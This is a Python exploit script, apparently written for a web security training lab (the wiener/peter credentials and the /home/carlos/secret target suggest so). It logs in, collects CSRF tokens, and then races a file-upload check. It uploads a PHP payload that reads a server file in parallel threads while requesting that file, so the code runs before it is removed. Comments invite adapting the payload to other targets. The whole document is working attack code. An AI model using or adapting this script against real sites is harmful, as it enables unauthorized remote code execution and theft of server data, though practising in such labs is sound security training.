import sys
import requests
import urllib3
import threading
import time
from bs4 import BeautifulSoup as bs
from requests_toolbelt import MultipartEncoder
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# for temporal uploads in some directory then after check or some process it gets removed or modified.

# if needed comment out the proxy variable and remove the proxy field on the requests

# get the login csrf token
def lcsrft(url, s):
    u2 = url + 'login'
    r = s.get(u2, verify=False, proxies=proxies) # proxies
    soup = bs(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    print(f'Token: {csrf}')
    return csrf

# get the file upload csrf token
def csrft(url, s):
    u2 = url + 'my-account?id=wiener'
    r = s.get(u2, verify=False, proxies=proxies) # proxies
    soup = bs(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    print(f'Token: {csrf}')
    return csrf

# perform the login if necessary
def login(url, s, csrf):
    u = url + "login"
    data = {'csrf':csrf, 'username':'wiener', 'password':'peter'}
    r = s.post(u, data=data, verify=False, proxies=proxies) # proxies
    if "Log out" in r.text:
        print("Logged in...")
    else:
        print("Login failed...")

def fileup(url, filename, s, updir, csrft):
    u = url + updir
    # modify the payload as needed
    # special attention to the file upload contents, content-type, and the other fields for this specific case data (user and csrf)
    fileshell = {'avatar':(f'{filename}',"<?php echo file_get_contents('/home/carlos/secret'); ?>","application/x-php"),'user':'wiener','csrf':csrft}
    boundary = "------WebKitFormBoundaryXkKjY8u58kur0RMh"
    m = MultipartEncoder(fields=fileshell,boundary=boundary)
    headers = {'Content-Type':m.content_type}
    r = s.post(u, data=m, headers=headers, verify=False, proxies=proxies) # proxies
    if "has been uploaded." in r.text:
        print("Success, file uploaded :)")
    else:
        print("Error uploading file :(")

# you need to know the upload directory and also the corresponding file name
# remember that some web applications modify the name of the file so it doesn't remains the same
def filexec(url, filename, s, execdir):
    time.sleep(0.5)
    u = url + execdir + f'/{filename}'
    r = s.get(u, proxies=proxies, verify=False) # proxies
    if r.status_code == 200:
        print(f"Cool 😎, it worked!:\n{r.text}")
    else:
        print("Not yet.")

def main():
    try:
        url = sys.argv[1]
        updir = sys.argv[2]
        execdir = sys.argv[3]
        filename = sys.argv[4]
        s = requests.Session()
        lct = lcsrft(url, s)
        login(url, s, lct)
        ct = csrft(url, s)
        threads = []
        # number of tries, in this case 8
        for _ in range(8):
            # modify the arguments to the functions as needed on the threads
            upload_thread = threading.Thread(target=fileup, args=(url, filename, s, updir, ct))
            access_thread = threading.Thread(target=filexec, args=(url, filename, s, execdir))
            upload_thread.start()
            access_thread.start()
            threads.append(upload_thread)
            threads.append(access_thread)
        for thread in threads:
            thread.join()

        print("[*] Attack completed.")
    except IndexError:
        print(f'Usage: {sys.argv[0]} <baseURL> <path2Upload> <path2Execute> <fileName+ext>')
        print(f"Example: {sys.argv[0]} 'http://example.com/' 'my-account/avatar' 'files/avatars' 'shell.php'")

if __name__ == '__main__':
    main()
